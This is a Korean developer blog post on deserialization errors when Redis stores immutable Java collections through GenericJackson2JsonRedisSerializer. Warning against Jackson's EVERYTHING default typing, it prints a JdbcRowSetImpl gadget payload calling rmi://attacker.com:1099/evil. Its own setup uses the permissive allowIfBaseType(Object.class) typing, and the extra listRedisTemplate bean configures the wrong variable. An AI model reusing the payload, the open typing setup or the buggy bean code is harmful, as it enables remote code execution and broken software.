---
layout: post
title:  "[Redis] GenericJackson2JsonRedisSerializer SerializationException"
date:   2025-08-24
author: EastGlow
categories: Back-end
---

# 1. 들어가며

보통 RedisTemplate의 ValueSerializer는 웬만한 타입을 다 지원하기 위해 GenericJackson2JsonRedisSerializer를 세팅해주고 있었다.

그런데 이것을 이용해서 역직렬화를 할 때 일부 클래스에서 문제가 생길 수 있는데 문제의 코드는 아래의 코드이다.

# 2. 문제의 코드

```java
this.objectMapper = new ObjectMapper();
objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
objectMapper.registerModules(new JavaTimeModule(), new Jdk8Module());
 
BasicPolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
        .allowIfBaseType(Object.class)
        .build();
objectMapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
```
Redis와 관련된 Bean들을 초기화 해주는 Auto Configuration 역할의 클래스에 있는 코드 중 일부이다.

위와 같은 코드로 RedisTemplate의 GenericJackson2JsonRedisSerializer에 세팅해줄 ObjectMapper를 설정하여 생성해주고 있다.

ObjectMapper와 관련된 설정을 잠깐 설명하자면, `allowIfBaseType`에 `Object.class`를 넣음으로써 사실상 모든 클래스를 다 지원하도록 하였다.

추가로 `ObjectMapper.DefaultTyping.NON_FINAL` 옵션을 통해 final이 아닌 클래스에 한해서 직렬화/역직렬화를 가능하게 하였다.

```java
RedisTemplate<String, Object> redisTemplate = new RedisTemplate<>();
redisTemplate.setConnectionFactory(redisConnectionFactory);
redisTemplate.setKeySerializer(RedisSerializer.string());
redisTemplate.setValueSerializer(new GenericJackson2JsonRedisSerializer(objectMapper));
```
앞서 만든 ObjectMapper를 위와 같이 GenericJackson2JsonRedisSerializer의 생성자 파라미터로 넘겨주고 있다.

# 3. 그래서 문제는?

역직렬화 시 Jackson에서는 Redis에 저장된 값의 타입 정보를 참고하여 역직렬화하는데 일부 클래스는 타입 정보가 빠진 채 저장되는 경우가 있었다.

바로 `List.of`, `Map.of` 등 불변객체로 만든 클래스는 저러한 타입 정보가 없어서 역직렬화가 불가능 하다는 것이었다.

## List.of

```java
redisTemplate.opsForValue().set("test", List.of("1","2","3"));
```

![](/assets/post/20250824_1.png)

위처럼 `List.of`로 Redis에 데이터를 저장하면 실제 저장된 데이터엔 타입 정보가 존재하지 않는 것을 볼 수 있다.

## ArrayList

```java
List<String> list = new ArrayList<>();
list.add("1");
list.add("2");
list.add("3");
redisTemplate.opsForValue().set("test1", list);
```

![](/assets/post/20250824_2.png)

반대로 `ArrayList`로 저장하면 정상적으로 타입 정보가 포함된 Redis 데이터를 볼 수 있다.

그래서 타입 정보가 없는 데이터를 RedisTemplate로 가져오려고 하면 아래처럼 에러가 발생한다.

```
org.springframework.data.redis.serializer.SerializationException: Could not read JSON: Could not resolve type id '1' as a subtype of `java.lang.Object`: no such class found
 at [Source: (byte[])"["1","2","3"]"; line: 1, column: 6]; nested exception is com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id '1' as a subtype of `java.lang.Object`: no such class found
 at [Source: (byte[])"["1","2","3"]"; line: 1, column: 6]
```
 
# 4. 해결방법

## [해결X] ObjectMapper.DefaultTyping.EVERYTHING 설정

`ObjectMapper.DefaultTyping.NON_FINAL` → `ObjectMapper.DefaultTyping.EVERYTHING`

final이 아닌 클래스에 대해서만 타입 정보를 저장하고 있던 기존 설정(NON_FINAL)에서 모든 클래스에 대해 타입 정보를 저장하도록(EVERYTHING) 바꿔보았다.

![](/assets/post/20250824_3.png)

그 결과 Redis 데이터에 타입 정보도 같이 저장된 것을 볼 수 있었으나, 또다른 에러가 발생하였다.

```
org.springframework.data.redis.serializer.SerializationException: Could not read JSON: Cannot construct instance of `java.util.ImmutableCollections$ListN` (no Creators, like default constructor, exist): no default no-arguments constructor found
 at [Source: (byte[])"["java.util.ImmutableCollections$ListN",["1","2","3"]]"; line: 1, column: 41]; nested exception is com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Cannot construct instance of `java.util.ImmutableCollections$ListN` (no Creators, like default constructor, exist): no default no-arguments constructor found
 at [Source: (byte[])"["java.util.ImmutableCollections$ListN",["1","2","3"]]"; line: 1, column: 41]
```

이유는 Jackson이 `java.util.ImmutableCollections$ListN` (즉, List.of(...))를 직접 인스턴스화할 수 없기 때문이라고 한다.

`EVERYTHING`으로 쓰더라도 역직렬화가 불가한 클래스는 쓸 수 없다. 대신, ArrayList로 한번 래핑하여 저장하도록 하는 것이 해결책이라고 할 수 있겠다.

그리고 `EVERYTHING`은 보안상 위험이 있다고 해서 가능하면 쓰지 않는게 좋다고 한다. @class로 포함되는 타입 정보는 Jackson이 역직렬화할 때 해당 클래스를 자동으로 로드하여 인스턴스화 하게 된다.

```
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://attacker.com:1099/evil",
  "autoCommit": true
}
```

위 JSON이 역직렬화되면
- JdbcRowSetImpl이 로딩되고,
- setDataSourceName(...) 호출되며,
- RMI(Remote Method Invocation)로 외부 공격자의 서버에 연결 시도 발생 → 원격 코드 실행(RCE) 취약점으로 이어질 수 있다고 하니 가능한 쓰면 안 되는 옵션이라 할 수 있겠다.

## [해결?] 기본 RedisTemplate<String, Object>외에 특정 타입용으로 하나 더 만들기

기존에 Redis와 관련된 영역은 `RedisTemplate<String, Object>`를 기본 Bean으로 쓰고 있는데 특정 타입에 대한 직렬화/역직렬화가 필요하면 별도로 만들어주면 된다.

```java
@Bean(name="listRedisTemplate")
public RedisTemplate<String, List<String>> listRedisTemplate(RedisConnectionFactory redisConnectionFactory, ObjectMapper objectMapper) {
    RedisTemplate<String, List<String>> listRedisTemplate = new RedisTemplate<>();
    redisTemplate.setConnectionFactory(redisConnectionFactory);
    redisTemplate.setKeySerializer(RedisSerializer.string());
    redisTemplate.setValueSerializer(new GenericJackson2JsonRedisSerializer(objectMapper));
    return listRedisTemplate;
}
```
위처럼 `List<String>`을 Value로 받는 RedisTemplate Bean을 하나 더 만들어주고 아래처럼 원하는 곳에서 주입받아 사용하면 된다.

```java
private final RedisTemplate<String, Object> redisTemplate;
private final RedisTemplate<String, List<String>> listRedisTemplate;
```

그러나, 필요한 타입마다 이렇게 하나씩 만들어서 쓰기엔 너무 번거롭고 귀찮다.

## [해결!] key를 set할 때 value를 한번 래핑해서 넣기

List.of로 생성된 리스트는 ArrayList로 래핑해서 넣으면 ArrayList로 타입 정보가 들어간다.

```java
redisTemplate.opsForValue().set("test", new ArrayList<>(List.of("1","2","3")));
```

# 글을 마치며

`RedisTemplate<String, Object>`를 사용해서 모든 타입의 value를 처리하고자 할 때, 타입 정보가 빠져서 역직렬화가 불가한 클래스들도 일부 있으니 개발 과정에서 set/get을 꼭 해보도록 하자. 글을 마치면서 대표적으로 많이 사용하는 타입에 대해 역직렬화 가능 여부를 표로 정리해두었으니 참고하기 바란다.

| 역직렬화 가능 여부 |클래스|비고|
|--|--|--|
| 가능 | ArrayList, HashMap, MyCustomDto, ... | 기본적으로 지원되는 클래스들이며 타입 정보가 같이 저장됨 |
| 가능 | Optional (java.util.Optional) | final이고 구조 복잡함 – 일부 Jackson 버전에서 역직렬화 불가 가능성 |
| 가능 | String, Integer, Boolean, Double 등 | final이지만 단순 타입이라 역직렬화 가능 (Jackson 기본 지원) |
| 가능 | Enum 타입 | final이지만 기본적으로 Jackson에서 지원함 |
| 불가능 | List.of(...) → ImmutableCollections.List | final 클래스, 타입 정보 빠짐 |
| 불가능 | Map.of(...) → ImmutableCollections.Map | final 클래스, 타입 정보 빠짐 |
| 불가능 | Set.of(...) → ImmutableCollections.SetN | final 클래스, 타입 정보 빠짐 |
